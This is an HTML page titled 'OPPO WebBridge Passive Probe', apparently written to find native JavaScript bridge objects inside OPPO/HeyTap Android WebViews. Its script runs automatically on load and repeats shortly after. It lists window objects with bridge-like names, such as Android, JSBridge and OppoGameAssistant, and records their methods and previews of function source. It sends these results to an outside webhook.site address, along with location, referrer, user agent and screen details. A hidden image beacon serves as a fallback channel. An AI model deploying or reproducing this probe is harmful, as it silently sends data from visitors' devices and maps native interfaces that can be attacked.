<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <title>OPPO WebBridge Passive Probe</title>
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <style>
    body { font-family: system-ui, Arial, sans-serif; padding: 16px; line-height: 1.4; }
    pre { white-space: pre-wrap; word-break: break-all; background: #f4f4f4; padding: 12px; border-radius: 8px; }
    button { padding: 10px 14px; margin: 6px 0; }
  </style>
</head>
<body>
  <h3>OPPO WebBridge Passive Probe</h3>
  <p id="status">running...</p>
  <button onclick="runProbe('manual_button')">Run passive probe again</button>
  <pre id="out"></pre>

<script>
(function () {
  const WEBHOOK = "https://webhook.site/c9351bd1-51a3-45c3-a3d0-936fd40c67b3";

  function safeString(x, max) {
    try {
      let s = String(x);
      if (s.length > max) s = s.slice(0, max) + "...[truncated]";
      return s;
    } catch (e) {
      return "[stringify_error:" + e + "]";
    }
  }

  function send(eventType, payload) {
    const body = JSON.stringify({
      eventType,
      ts: new Date().toISOString(),
      href: location.href,
      ua: navigator.userAgent,
      payload
    });

    // POST: 主通道
    try {
      fetch(WEBHOOK, {
        method: "POST",
        mode: "no-cors",
        headers: { "Content-Type": "text/plain;charset=UTF-8" },
        body
      }).catch(function(){});
    } catch (e) {}

    // GET: 兜底通道，避免部分 WebView 禁止 fetch
    try {
      const img = new Image();
      img.src = WEBHOOK + "?event=" + encodeURIComponent(eventType) +
        "&t=" + Date.now() +
        "&d=" + encodeURIComponent(body.slice(0, 7000));
    } catch (e) {}
  }

  function describeValue(name, value) {
    const item = {
      name,
      type: typeof value,
      tag: Object.prototype.toString.call(value),
      ownKeys: [],
      functionKeys: [],
      valuePreview: null,
      error: null
    };

    try {
      if (value === null || value === undefined) {
        item.valuePreview = String(value);
        return item;
      }

      if (typeof value === "function") {
        item.valuePreview = safeString(Function.prototype.toString.call(value), 200);
      } else if (typeof value !== "object") {
        item.valuePreview = safeString(value, 200);
      }

      if (typeof value === "object" || typeof value === "function") {
        let keys = [];
        try { keys = Object.getOwnPropertyNames(value); } catch (e) { keys = []; }

        item.ownKeys = keys.slice(0, 80);

        for (const k of keys.slice(0, 120)) {
          try {
            const desc = Object.getOwnPropertyDescriptor(value, k);
            if (desc && "value" in desc && typeof desc.value === "function") {
              item.functionKeys.push(k);
            }
          } catch (e) {}
        }
      }
    } catch (e) {
      item.error = String(e);
    }

    return item;
  }

  function looksBridgeName(k) {
    return /bridge|android|oppo|oplus|heytap|game|assistant|native|router|client|webview|javascript/i.test(k);
  }

  function runProbe(reason) {
    const result = {
      reason,
      location: {
        href: location.href,
        origin: location.origin,
        protocol: location.protocol,
        referrer: document.referrer || null
      },
      environment: {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        cookieEnabled: navigator.cookieEnabled,
        webdriver: navigator.webdriver,
        screen: {
          width: screen.width,
          height: screen.height,
          availWidth: screen.availWidth,
          availHeight: screen.availHeight
        },
        viewport: {
          innerWidth: innerWidth,
          innerHeight: innerHeight
        }
      },
      suspectedWindowKeys: [],
      suspectedObjects: [],
      allBridgeLikeKeys: [],
      errors: []
    };

    let winKeys = [];
    try {
      winKeys = Object.getOwnPropertyNames(window);
    } catch (e) {
      result.errors.push("window_keys_error=" + e);
    }

    result.allBridgeLikeKeys = winKeys.filter(looksBridgeName).sort();

    const candidateNames = new Set([
      "Android",
      "android",
      "JSBridge",
      "jsBridge",
      "JavascriptBridge",
      "JavaScriptBridge",
      "WebViewJavascriptBridge",
      "webkit",
      "Oppo",
      "OPPO",
      "Oplus",
      "OPlus",
      "HeyTap",
      "heytap",
      "GameAssistant",
      "gameAssistant",
      "OppoGameAssistant",
      "oppoGameAssistant",
      "OppoGameSpace",
      "oppoGameSpace",
      "Native",
      "native",
      "NativeBridge",
      "nativeBridge",
      "Client",
      "client",
      "Router",
      "router",
      "App",
      "app"
    ]);

    for (const k of result.allBridgeLikeKeys) candidateNames.add(k);

    for (const name of Array.from(candidateNames).sort()) {
      try {
        if (!(name in window)) continue;
        result.suspectedWindowKeys.push(name);
        result.suspectedObjects.push(describeValue(name, window[name]));
      } catch (e) {
        result.suspectedObjects.push({ name, error: String(e) });
      }
    }

    const text = JSON.stringify(result, null, 2);
    document.getElementById("status").textContent = "PASSIVE_PROBE_DONE: " + new Date().toISOString();
    document.getElementById("out").textContent = text;

    send("PASSIVE_BRIDGE_PROBE_RESULT", result);
    return result;
  }

  window.runProbe = runProbe;

  send("PAGE_LOADED", {
    title: document.title,
    href: location.href,
    ua: navigator.userAgent
  });

  setTimeout(function () {
    runProbe("auto_after_load_500ms");
  }, 500);

  setTimeout(function () {
    runProbe("auto_after_load_2500ms");
  }, 2500);

  window.addEventListener("error", function (e) {
    send("PAGE_JS_ERROR", {
      message: e.message,
      filename: e.filename,
      lineno: e.lineno,
      colno: e.colno
    });
  });

  window.addEventListener("unhandledrejection", function (e) {
    send("PAGE_UNHANDLED_REJECTION", {
      reason: safeString(e.reason, 500)
    });
  });
})();
</script>
</body>
</html>
